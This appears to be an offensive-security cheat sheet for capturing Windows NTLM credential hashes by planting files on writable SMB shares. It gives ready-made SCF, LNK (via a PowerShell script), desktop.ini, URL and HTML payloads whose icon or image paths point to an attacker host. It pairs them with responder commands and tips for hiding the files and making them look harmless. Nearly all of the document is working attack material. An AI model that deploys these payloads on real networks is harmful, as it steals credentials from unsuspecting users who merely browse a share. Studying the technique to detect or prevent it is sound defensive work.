# General Guidelines
1. try to place the below files in place that you know will be visited alot. Examples include:
	- Public Network Shares
	- The Public User desktop --> is loaded for all users on a machine
2. use the folder/ini combination as it's stealthy
3. have the SMB links point to legit icons to lower suspicion
4. by the same concept, have the image urls point to legit images
5. Trick: you can always point to a non-existing name and responder will respond to that

# Automatic on folder/share visit I: SCF Files
```
[Shell]
Command=2
IconFile=\\<ATTACKER_IP>\DesktopSettings.config
[Taskbar]
Command=ToggleDesktop
```
1. Put the contents into a non-suspicious file name like `@DesktopSettings.scf`
2. *If you created the file on a linux system,* use `unix2dos` to make it suitable for windows
3. Place the file in the writable SMB share (won't work if hidden)
4. Fire up responder `responder -I eth0`

# Automatic on folder/share visit II: LNK Files
```powershell
$Output_For_Lnk = "$pwd\Database.lnk"
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut($Output_For_Lnk)
$lnk.TargetPath = "\\<ATTACKER_IP>\@DB"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Database"
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```
1. Run the PowerShell script, it will save the `.lnk` file in the current working directory
2. Place the file in the writable SMB share (won't work if hidden)
3. Fire up responder `responder -I eth0`

# Automatic on folder/share visit III: Creating a system folder and placing `desktop.ini` inside it
```
[.ShellClassInfo]
IconResource=\\<ATTACKER_IP>\settings
```
1. save the file with the above contents inside a `desktop.ini` file
2. *If you created the file on a linux system,* use `unix2dos` to make it suitable for windows
3. connect to the writable SMB share using `smbclient`
4. create a folder and give it a non-suspicious name using `mkdir`
5. set the folder attribute to be a system folder using `setmode <FOLDER> +s`
6. change int the new folder
7. upload the `desktop.ini` file `put <INI_FILE>`
8. make it a system file using `setmode <INI_FILE> +s`
9. and make it hidden using `setmode <INI_FILE> +h`
10. *overall,* it should like this:
```
smb: \> mkdir <FOLDER>
smb: \> setmode <FOLDER> +s
smb: \> cd <FOLDER>
smb: \> put <INI_FILE>
smb: \> setmode <INI_FILE> +s
smb: \> setmode <INI_FILE> +h
```
11. fire up responder `responder -I eth0`

# Automatic on folder/share visit IV: URL files
```
[InternetShortcut]
URL=<URL_OF_CHOICE>
WorkingDirectory=<DIR_OF_CHOICE>
IconFile=\\<ATTACKER_IP>\test
IconIndex=1
```
1. Put the contents into a non-suspicious file name like `IESettings.url`
2. *If you created the file on a linux system,* use `unix2dos` to make it suitable for windows
3. Place the file in the writable SMB share (will work if hidden and the user enabled `show hidden files`. otherwise won't work)
4. Fire up responder `responder -I eth0`

# Must be opened to work: HTML files (tested on IE & Chrome)
```
<img src="\\\\<ATTACKER_IP>\\img">
```
1. Put the contents into a non-suspicious file name like `bookmarks.html`
2. *If you created the file on a linux system,* use `unix2dos` to make it suitable for windows
3. Place the file in the writable SMB share (won't work if hidden)
4. Fire up responder `responder -I eth0`

### Note
- you can hide any file when in an `smbclient` prompt using `setmode <FILE_NAM> +h`
- you can unhide any file when in an `smbclient` prompt using `setmode <FILE_NAM> -h`